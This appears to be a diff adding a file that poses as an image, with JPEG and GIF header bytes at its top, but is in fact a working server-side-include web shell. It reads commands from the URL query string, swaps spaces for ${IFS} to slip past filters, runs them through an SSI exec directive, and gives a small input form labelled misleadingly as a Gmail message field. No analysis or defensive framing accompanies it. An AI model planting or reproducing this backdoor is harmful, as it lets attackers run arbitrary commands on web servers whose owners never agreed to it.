@@ -1,0 +1,41 @@
+ÿØÿàÿØÿà
+ÿØÿàÿØÿàGIF89a
+ÿØÿàÿØÿà
+GIF89a<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+
+<script language="javascript">
+    function fex()
+    {
+        var uri = document.getElementById('command').value;
+        var rep = uri.replace(/[ ]/g,'${IFS}');
+        var res = encodeURI(uri);
+        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+    }
+    </script>
+    <script>
+    document.onkeydown = keydown;
+    function keydown(e) {
+        if (!e) e = event;
+        if (e.keyCode === 13) {
+            var uri = document.getElementById('command').value;
+            var rep = uri.replace(/[ ]/g,'${IFS}');
+            var res = encodeURI(uri);
+            document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+    
+        }
+    }
+    </script>
+    
+    </head>
+    <body>
+<center><input type=text size=20 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;"> <input type=button value=Execute onclick="fex();">
+    <hr>
+    SEND MESSAGE TO GMAIL : </font><b><!--#echo var=shl --></b><br>
+<!--#exec cmd=$shl -->
